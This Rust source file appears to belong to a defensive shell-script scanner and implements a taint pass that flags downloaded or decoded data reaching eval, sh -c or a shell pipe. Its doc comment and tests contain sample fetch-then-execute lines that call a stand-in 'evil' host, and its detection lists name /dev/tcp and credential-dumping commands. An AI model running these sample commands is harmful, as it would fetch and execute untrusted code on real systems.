//! T1.3 dataflow taint: untrusted input reaching an execution sink.
//!
//! Many payloads split the fetch and the execution across two statements to
//! dodge the single-line `curl … | sh` rule:
//!
//! ```sh
//! payload="$(curl -s http://evil/x)"
//! eval "$payload"
//! ```
//!
//! Neither line is damning on its own. This pass connects them: a variable
//! assigned from a *taint source* (a downloader, `printenv`/`env`, or a decode
//! of attacker-controlled data) becomes tainted, and if that variable is later
//! expanded inside an *execution sink* (`eval`, `sh -c`, `bash -c`, `source`,
//! or a pipe into a shell) it raises **`TAINTED_EXEC` (Critical)**.
//!
//! The analysis is intentionally shallow (assignment + later expansion, no
//! scoping) so it stays fast and dependency-free; it complements the AST pass
//! in [`crate::astscan`] rather than replacing it.

use crate::report::{Finding, Severity};
use std::collections::HashSet;

/// Commands whose output is attacker-controlled when captured into a variable.
const TAINT_SOURCES: &[&str] = &[
    "curl ",
    "wget ",
    "fetch ",
    "printenv",
    "env ",
    "base64 -d",
    "base64 --decode",
    "xxd -r",
    "openssl enc -d",
    "/dev/tcp/",
];

/// Tokens that mean "execute this string" when a tainted variable flows in.
const EXEC_SINKS: &[&str] = &["eval ", "eval\t", "sh -c", "bash -c", "source ", ". \""];

/// Run the taint pass over `text`.
pub fn scan(text: &str, findings: &mut Vec<Finding>) {
    let mut tainted: HashSet<String> = HashSet::new();

    for (idx, raw) in text.lines().enumerate() {
        let lineno = idx + 1;
        let line = raw.trim();
        let lower = line.to_ascii_lowercase();
        if lower.is_empty() || line.starts_with('#') {
            continue;
        }

        // Sink check first: does this line execute a tainted variable?
        if is_exec_sink(&lower) || pipes_to_shell(&lower) {
            for var in &tainted {
                if references(line, var) {
                    findings.push(
                        Finding::at(
                            Severity::Critical,
                            "TAINTED_EXEC",
                            format!("Untrusted input in ${var} reaches an execution sink"),
                            lineno,
                        )
                        .with_arg(var.clone()),
                    );
                    break;
                }
            }
        }

        // Then propagate taint from any assignment on this line.
        if let Some((name, rhs)) = assignment(line) {
            let rhs_lower = rhs.to_ascii_lowercase();
            if TAINT_SOURCES.iter().any(|s| rhs_lower.contains(s)) {
                tainted.insert(name.to_string());
            } else if tainted.iter().any(|v| references(rhs, v)) {
                // Taint propagates through `b="$a"`.
                tainted.insert(name.to_string());
            } else {
                // Reassigned from a clean source → clears prior taint.
                tainted.remove(name);
            }
        }
    }
}

/// Parse a leading `NAME=...` assignment, returning `(name, rhs)`.
fn assignment(line: &str) -> Option<(&str, &str)> {
    let eq = line.find('=')?;
    let name = &line[..eq];
    if name.is_empty() || !name.bytes().next()?.is_ascii_alphabetic() {
        return None;
    }
    if !name.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_') {
        return None;
    }
    Some((name, &line[eq + 1..]))
}

/// Whether `line` expands `$var` or `${var}`.
fn references(line: &str, var: &str) -> bool {
    let braced = format!("${{{var}}}");
    if line.contains(&braced) {
        return true;
    }
    // `$var` not followed by an identifier char (so `$payload` ≠ `$payloads`).
    let needle = format!("${var}");
    let bytes = line.as_bytes();
    let mut from = 0;
    while let Some(pos) = line[from..].find(&needle) {
        let end = from + pos + needle.len();
        let next_ok = bytes
            .get(end)
            .map_or(true, |&b| !(b.is_ascii_alphanumeric() || b == b'_'));
        if next_ok {
            return true;
        }
        from = end;
    }
    false
}

/// Whether the line is an execution sink.
fn is_exec_sink(lower: &str) -> bool {
    EXEC_SINKS.iter().any(|s| lower.contains(s))
}

/// Whether the line pipes into a shell interpreter.
fn pipes_to_shell(lower: &str) -> bool {
    lower.contains("| sh")
        || lower.contains("|sh")
        || lower.contains("| bash")
        || lower.contains("|bash")
        || lower.contains("| zsh")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn fetch_then_eval_is_tainted() {
        let src = "payload=\"$(curl -s http://evil/x)\"\neval \"$payload\"\n";
        let mut f = Vec::new();
        scan(src, &mut f);
        assert!(f.iter().any(|x| x.code == "TAINTED_EXEC"), "{f:?}");
    }

    #[test]
    fn taint_propagates_through_assignment() {
        let src = "a=$(wget -qO- http://x)\nb=\"$a\"\nsh -c \"$b\"\n";
        let mut f = Vec::new();
        scan(src, &mut f);
        assert!(f.iter().any(|x| x.code == "TAINTED_EXEC"), "{f:?}");
    }

    #[test]
    fn clean_variable_eval_not_flagged() {
        let src = "msg=\"hello world\"\neval \"echo $msg\"\n";
        let mut f = Vec::new();
        scan(src, &mut f);
        assert!(f.is_empty(), "{f:?}");
    }

    #[test]
    fn pipe_to_shell_of_tainted_var() {
        let src = "p=$(curl http://x)\necho \"$p\" | bash\n";
        let mut f = Vec::new();
        scan(src, &mut f);
        assert!(f.iter().any(|x| x.code == "TAINTED_EXEC"), "{f:?}");
    }
}
